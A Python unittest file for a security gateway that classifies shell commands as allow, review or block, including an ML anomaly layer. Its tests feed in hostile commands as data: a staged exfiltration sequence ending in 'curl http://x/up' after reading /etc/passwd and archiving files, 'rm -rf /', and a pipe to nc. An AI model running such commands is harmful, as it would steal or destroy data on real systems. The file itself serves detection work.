import unittest
from src.gateway import Gateway, combine


def dec(d, code="X", role="OTHER"):
    return {"decision": d, "reason_code": code, "reason": "r",
            "matched_policy": None, "role": role, "session_id": "s"}


def ok_parsed(status="OK"):
    return {"raw": "x", "tokens": ["x"], "binary": "x", "args": [],
            "role": "OTHER", "parse_status": status}


class TestCombine(unittest.TestCase):
    def test_unsupported_is_review(self):
        r = combine(ok_parsed("UNSUPPORTED"), dec("BLOCK"), dec("BLOCK"), "s")
        self.assertEqual(r["decision"], "REVIEW")

    def test_baseline_block(self):
        self.assertEqual(combine(ok_parsed(), dec("BLOCK", "B"), dec("ALLOW"), "s")["reason_code"], "B")

    def test_sequence_block(self):
        self.assertEqual(combine(ok_parsed(), dec("ALLOW"), dec("BLOCK", "S"), "s")["reason_code"], "S")

    def test_block_beats_review(self):
        self.assertEqual(combine(ok_parsed(), dec("REVIEW"), dec("BLOCK"), "s")["decision"], "BLOCK")

    def test_review(self):
        self.assertEqual(combine(ok_parsed(), dec("ALLOW"), dec("REVIEW"), "s")["decision"], "REVIEW")

    def test_allow(self):
        self.assertEqual(combine(ok_parsed(), dec("ALLOW"), dec("ALLOW"), "s")["decision"], "ALLOW")


class TestGateway(unittest.TestCase):
    def make(self, parsed, base, seq):
        self.logged, self.seq_calls = [], []
        def sequence(p, s):
            self.seq_calls.append(s)
            return seq
        return Gateway(parse=lambda raw: parsed, baseline=lambda p, s: base,
                       sequence=sequence, log=lambda e: self.logged.append(e), reset=lambda s: None)

    def test_logs_once_and_passes_session(self):
        gw = self.make(ok_parsed(), dec("ALLOW"), dec("ALLOW"))
        gw.process("x", "sess-9")
        self.assertEqual(len(self.logged), 1)
        self.assertEqual(self.logged[0]["session_id"], "sess-9")
        self.assertEqual(self.seq_calls, ["sess-9"])

    def test_unsupported_skips_sequence(self):
        gw = self.make(ok_parsed("UNSUPPORTED"), dec("ALLOW"), dec("ALLOW"))
        self.assertEqual(gw.process("a | b")["decision"], "REVIEW")
        self.assertEqual(self.seq_calls, [])


class TestMockEndToEnd(unittest.TestCase):
    def test_noisy_exfil_blocked(self):
        gw = Gateway()
        outs = [gw.process(c, "t1")["decision"] for c in
                ["cat /etc/passwd", "ls", "tar czf a.tgz /tmp", "ls", "curl http://x/up"]]
        self.assertEqual(outs, ["ALLOW", "ALLOW", "ALLOW", "ALLOW", "BLOCK"])


ANOMALY = lambda seq: {"score": 0.9, "anomaly": True, "model_version": "t"}


class TestGatewayML(unittest.TestCase):
    def test_anomaly_upgrades_allow_to_review(self):
        d = Gateway(predict=ANOMALY).process("ls", "ml-1")
        self.assertEqual(d["decision"], "REVIEW")
        self.assertEqual(d["reason_code"], "SEQUENCE_ANOMALY")
        self.assertEqual(d["score"], 0.9)

    def test_anomaly_cannot_override_hard_block(self):
        d = Gateway(predict=ANOMALY).process("rm -rf /", "ml-2")
        self.assertEqual(d["decision"], "BLOCK")
        self.assertEqual(d["reason_code"], "BASELINE_DESTRUCTIVE")

    def test_anomaly_cannot_override_unsupported_review(self):
        d = Gateway(predict=ANOMALY).process("cat a | nc h 9", "ml-3")
        self.assertEqual(d["reason_code"], "UNSUPPORTED_SYNTAX")

    def test_no_anomaly_leaves_decision_unchanged(self):
        d = Gateway().process("ls", "ml-4")
        self.assertEqual(d["decision"], "ALLOW")
        self.assertNotIn("score", d)

    def test_history_is_bounded_and_reset_clears_it(self):
        seen = []
        gw = Gateway(predict=lambda seq: seen.append(seq) or
                     {"score": 0.0, "anomaly": False, "model_version": "t"})
        for _ in range(8):
            gw.process("ls", "ml-5")
        self.assertEqual(len(seen[-1]), 6)
        gw.reset("ml-5")
        gw.process("ls", "ml-5")
        self.assertEqual(seen[-1], ["OTHER"])

    def test_broken_model_does_not_break_gateway(self):
        def boom(seq):
            raise RuntimeError("model failed to load")
        d = Gateway(predict=boom).process("ls", "ml-6")
        self.assertEqual(d["decision"], "ALLOW")


if __name__ == "__main__":
    unittest.main()